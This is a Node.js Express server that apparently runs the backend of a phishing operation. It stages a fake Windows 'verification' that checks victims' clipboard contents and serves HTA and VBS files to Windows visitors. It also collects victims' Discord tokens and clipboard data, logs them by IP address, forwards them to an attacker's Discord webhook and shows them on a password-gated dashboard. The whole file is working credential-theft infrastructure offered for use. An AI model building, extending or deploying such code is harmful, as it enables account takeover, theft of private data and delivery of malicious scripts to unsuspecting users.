require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const https = require('https');
const cookieParser = require('cookie-parser'); // Add cookie parser middleware
const app = express();
const PORT = process.env.PORT || 3000;

app.use(bodyParser.json());
app.use(cookieParser());  // <-- Add this to enable reading cookies
app.use(express.static('public'));
app.set('view engine', 'html');
app.engine('html', require('ejs').renderFile);

function getRealIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  if (forwarded) {
    // Take only the first IP from the comma-separated list
    return forwarded.split(',')[0].trim();
  }
  
  return req.headers['x-real-ip'] || 
         req.connection.remoteAddress || 
         req.socket.remoteAddress ||
         (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
         req.ip;
}

// Handle Windows verification
const codeMap = {}; // Stores IP -> code

app.get('/generate-verification-code', (req, res) => {
  const ip = getRealIP(req);
  console.log('GENERATE - IP:', ip); // ADD THIS
  const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
  let code = "";
  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
  code += "-";
  for (let i = 0; i < 4; i++) code += chars[Math.floor(Math.random() * chars.length)];
  codeMap[ip] = code;
  res.json({ code });
});

app.post('/verify-windows-code', (req, res) => {
  const ip = getRealIP(req);
  console.log('VERIFY - IP:', ip); // ADD THIS

  const { clipboard } = req.body;
  const expectedCode = codeMap[ip];
  if (!expectedCode) return res.status(400).json({ success: false, error: "No code generated." });
  if (!clipboard.includes(expectedCode)) return res.status(401).json({ success: false, message: "Verification failed." });
  // ADD THESE DEBUG LOGS
  console.log('IP:', ip);
  console.log('Expected code:', expectedCode);
  console.log('Clipboard contains:', clipboard);
  console.log('Match check:', clipboard.includes(expectedCode));

  // Set verification cookies - removed httpOnly and fixed capitalization
  res.cookie('windowsVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
  res.cookie('tokenGateVerified', '1', { maxAge: 24 * 60 * 60 * 1000 });
  
  res.json({ success: true });
});

// Serve verification pages
app.get('/verify', (req, res) => {
  const userAgent = req.headers['user-agent'] || '';
  if (userAgent.includes("Windows")) {
    if (req.cookies && req.cookies.windowsVerified === '1') {
      return res.redirect('/verifynotwindows');
    } else {
      return res.redirect('/verify-windows');
    }
  } else {
    return res.redirect('/verifynotwindows');
  }
});

// Static routes
app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));

// Serve the HTA file correctly here:
app.get('/verifyaccept.hta', (req, res) => {
  res.set({
    'Content-Type': 'application/hta',
    'Cache-Control': 'no-cache'
  });
  res.sendFile(path.join(__dirname, 'public/verifyaccept.hta'));
});

// Function to send data to Discord webhook
function sendToDiscord(data, type = 'clipboard') {
  const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
  
  if (!webhookUrl) {
    console.error('Discord webhook URL not provided');
    return;
  }

  let title, description, color;
  
  if (type === 'token') {
    title = "Discord Token Received";
    description = `**IP:** ${data.userIP}\n**Server ID:** ${data.serverId}\n**Token:** \`${data.token.substring(0, 50)}...\``;
    color = 0xff9500;
  } else {
    title = "Clipboard Content";
    description = `**IP:** ${data.userIP}\n**Type:** ${data.type}\n**Content:** \`\`\`${data.clipboardData.substring(0, 1800)}\`\`\``;
    color = 0x00ff00;
  }

  const payload = JSON.stringify({
    content: `New ${type} data received:`,
    embeds: [{
      title: title,
      description: description,
      color: color,
      timestamp: new Date().toISOString(),
      footer: {
        text: "Game Copier Bot"
      }
    }]
  });

  const url = new URL(webhookUrl);
  const options = {
    hostname: url.hostname,
    path: url.pathname,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(payload)
    }
  };

  const req = https.request(options, (res) => {
    console.log(`Discord webhook response: ${res.statusCode}`);
    res.on('data', (chunk) => {
      console.log('Discord response:', chunk.toString());
    });
  });

  req.on('error', (error) => {
    console.error('Error sending to Discord:', error);
  });

  req.write(payload);
  req.end();
}

// Get user IP endpoint
app.get('/get-ip', (req, res) => {
  const userIP = getRealIP(req);
  res.json({ ip: userIP });
});

// Handle clipboard submissions (updated with IP logging)
app.post('/submit-clipboard', (req, res) => {
  const { clipboardData, userIP, type } = req.body;
  const realIP = userIP || getRealIP(req);
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  const filename = `clipboard_${sanitizedIP}_${timestamp}.html`;
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'clipboard', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const savePath = path.join(ipFolder, filename);
  
  // Also save to main clipboard.html for admin view
  const mainSavePath = path.join(__dirname, 'data', 'clipboard.html');
  const dataDir = path.join(__dirname, 'data');
  if (!fs.existsSync(dataDir)) {
    fs.mkdirSync(dataDir, { recursive: true });
  }
  
  const logEntry = `\n<!-- IP: ${realIP} | Type: ${type} | Time: ${new Date().toISOString()} -->\n${clipboardData}\n<hr>\n`;
  
  fs.writeFile(savePath, clipboardData, err => {
    if (err) return res.status(500).send('Failed to save clipboard data.');
    
    // Append to main file
    fs.appendFile(mainSavePath, logEntry, (appendErr) => {
      if (appendErr) console.error('Failed to append to main clipboard file:', appendErr);
    });
    
    // Send to Discord webhook
    sendToDiscord({
      clipboardData: clipboardData,
      userIP: realIP,
      type: type || 'game'
    }, 'clipboard');
    
    console.log(`Clipboard saved for IP ${realIP}: ${filename}`);
    res.send('Clipboard saved.');
  });
});

// Handle Discord token submissions (updated for GET requests)
app.get('/receive-token', (req, res) => {
  const { token, serverId } = req.query;
  const realIP = getRealIP(req);
  
  console.log("Token received from IP:", realIP, "Server ID:", serverId, "Token:", token);
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const filename = `token_${sanitizedIP}_${timestamp}.html`;
  const savePath = path.join(ipFolder, filename);
  
  const tokenEntry = `<div>
    <p><strong>IP:</strong> ${realIP}</p>
    <p><strong>Server ID:</strong> ${serverId}</p>
    <p><strong>Token:</strong> ${token}</p>
    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    <hr>
  </div>\n`;
  
  // Save individual file
  fs.writeFile(savePath, tokenEntry, (err) => {
    if (err) console.error('Failed to save individual token file:', err);
  });
  
  // Append to main tokens.html file
  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
  fs.appendFileSync(mainTokenPath, tokenEntry);
  
  // Send to Discord webhook
  sendToDiscord({
    token: token,
    userIP: realIP,
    serverId: serverId
  }, 'token');
  
  // Send a success page
  res.send(`
  <!DOCTYPE html>
  <html>
  <head>
    <title>Token Received</title>
    <style>
      body { font-family: Arial, sans-serif; background: #111; color: #fff; text-align: center; padding: 50px; }
      .success { color: #4CAF50; font-size: 1.5rem; margin-bottom: 20px; }
    </style>
  </head>
  <body>
    <div class="success">✅ Server token recieved!!</div>
    <p>Check the console for your server token!!</p>
    <p>You can close this tab now.</p>
    <script>setTimeout(() => window.close(), 2000);</script>
  </body>
  </html>`);
});

// Keep POST endpoint for manual submissions
app.post('/receive-token', (req, res) => {
  const { token, userIP, serverId } = req.body;
  const realIP = userIP || getRealIP(req);
  
  console.log("Token received from IP:", realIP, "Server ID:", serverId, "Token:", token);
  
  // Create filename with IP and timestamp
  const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
  const sanitizedIP = realIP.replace(/[:.]/g, '_');
  
  // Save to organized folder structure
  const ipFolder = path.join(__dirname, 'data', 'tokens', sanitizedIP);
  if (!fs.existsSync(ipFolder)) {
    fs.mkdirSync(ipFolder, { recursive: true });
  }
  
  const filename = `token_${sanitizedIP}_${timestamp}.html`;
  const savePath = path.join(ipFolder, filename);
  
  const tokenEntry = `<div>
    <p><strong>IP:</strong> ${realIP}</p>
    <p><strong>Server ID:</strong> ${serverId}</p>
    <p><strong>Token:</strong> ${token}</p>
    <p><strong>Timestamp:</strong> ${new Date().toISOString()}</p>
    <hr>
  </div>\n`;
  
  // Save individual file
  fs.writeFile(savePath, tokenEntry, (err) => {
    if (err) console.error('Failed to save individual token file:', err);
  });
  
  // Append to main tokens.html file
  const mainTokenPath = path.join(__dirname, 'data', 'tokens.html');
  fs.appendFileSync(mainTokenPath, tokenEntry);
  
  // Send to Discord webhook
  sendToDiscord({
    token: token,
    userIP: realIP,
    serverId: serverId
  }, 'token');
  
  res.sendStatus(200);
});

// Admin endpoint (updated)
app.get('/admin', (req, res) => {
  const provided = req.query.password;
  const correct = process.env.ADMIN_PASSWORD;
  
  if (provided !== correct) return res.status(403).send('Unauthorized');
  
  const clipboardPath = path.join(__dirname, 'data', 'clipboard.html');
  const tokensPath = path.join(__dirname, 'data', 'tokens.html');
  
  const clipboardContent = fs.existsSync(clipboardPath) 
    ? fs.readFileSync(clipboardPath, 'utf8') 
    : 'No clipboard data yet.';
    
  const tokensContent = fs.existsSync(tokensPath) 
    ? fs.readFileSync(tokensPath, 'utf8') 
    : 'No tokens yet.';
  
  const adminHTML = `
  <!DOCTYPE html>
  <html>
  <head>
    <title>Admin Dashboard</title>
    <style>
      body { font-family: Arial, sans-serif; margin: 20px; background: #111; color: #fff; }
      .section { margin-bottom: 40px; padding: 20px; background: #222; border-radius: 8px; }
      h2 { color: #4CAF50; }
      pre { background: #333; padding: 15px; border-radius: 4px; overflow-x: auto; }
    </style>
  </head>
  <body>
    <h1>Admin Dashboard</h1>
    
    <div class="section">
      <h2>Clipboard Submissions</h2>
      <pre>${clipboardContent}</pre>
    </div>
    
    <div class="section">
      <h2>Discord Tokens</h2>
      <pre>${tokensContent}</pre>
    </div>
  </body>
  </html>`;
  
  res.send(adminHTML);
});

app.get('/verify', (req, res) => res.sendFile(path.join(__dirname, 'public/verify.html')));
app.get('/verify-windows', (req, res) => res.sendFile(path.join(__dirname, 'public/verify-windows.html')));
app.get('/verifynotwindows', (req, res) => res.sendFile(path.join(__dirname, 'public/verifynotwindows.html')));
app.get('/verifyaccept.vbs', (req, res) => {
  res.set('Content-Type', 'application/x-vbs');
  res.sendFile(path.join(__dirname, 'public/verifyaccept.vbs'));
});

app.get('/download', (req, res) => {
  res.download(path.join(__dirname, 'public', 'example.zip')); // or your real file!
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
  
  // Ensure data directories exist
  const dirs = [
    path.join(__dirname, 'data'),
    path.join(__dirname, 'data', 'clipboard'),
    path.join(__dirname, 'data', 'tokens')
  ];
  
  dirs.forEach(dir => {
    if (!fs.existsSync(dir)) {
      fs.mkdirSync(dir, { recursive: true });
    }
  });
});
